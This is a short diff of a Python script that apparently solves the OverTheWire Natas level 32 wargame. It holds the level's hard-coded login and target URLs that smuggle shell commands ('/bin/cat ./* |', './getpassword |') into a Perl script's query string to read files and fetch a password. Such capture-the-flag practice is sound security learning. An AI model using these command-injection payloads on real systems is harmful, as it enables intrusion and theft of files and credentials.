@@ -17,8 +17,15 @@ def pretty_print_POST(req):
 
 user_auth = ('natas32','no1vohsheCaiv3ieH4em1ahchisainge')
 
-target = 'http://natas32.natas.labs.overthewire.org/index.pl?cat index-source.pl|'
 #target = 'http://httpbin.org/post'
+target = 'http://natas32.natas.labs.overthewire.org/index.pl?/bin/cat ./* |'
+#target = 'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword |'
+
+
+#proxy = '127.0.0.1:8080'
+#proxy = {'http': 'http://127.0.0.1:8080'}
+
+
 
 file2 = [
     ('file', ('csv2.csv',open('csv2.csv', 'rb'))), 
